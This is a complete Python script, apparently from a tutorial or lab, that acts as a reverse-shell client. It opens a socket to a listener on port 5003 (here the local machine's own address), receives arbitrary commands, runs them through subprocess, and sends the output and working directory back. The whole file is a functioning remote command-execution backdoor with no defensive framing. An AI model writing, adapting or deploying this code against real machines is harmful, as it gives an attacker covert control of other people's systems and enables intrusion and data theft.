from email import message
import socket
import os
import subprocess
import sys

hostname=socket.gethostname()
ser_host = socket.gethostbyname(hostname) 
ser_port = 5003
size = 1024*128
sep = "<sep>"

s = socket.socket()
s.connect((ser_host, ser_port))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(size).decode()
    split_command = command.split()

    if command.lower() == "exit":
        break

    if split_command[0].lower() == "cd":
        try:
            os.chdir(''.join(split_command[1:]))
        except FileNotFoundError as e:
            out = str(e)
        else:
            out = ""
    else:
        out = subprocess.getoutput(command)

    cwd = os.getcwd()

    msg = f"{out}{sep}{cwd}"
    s.send(msg.encode())

s.close()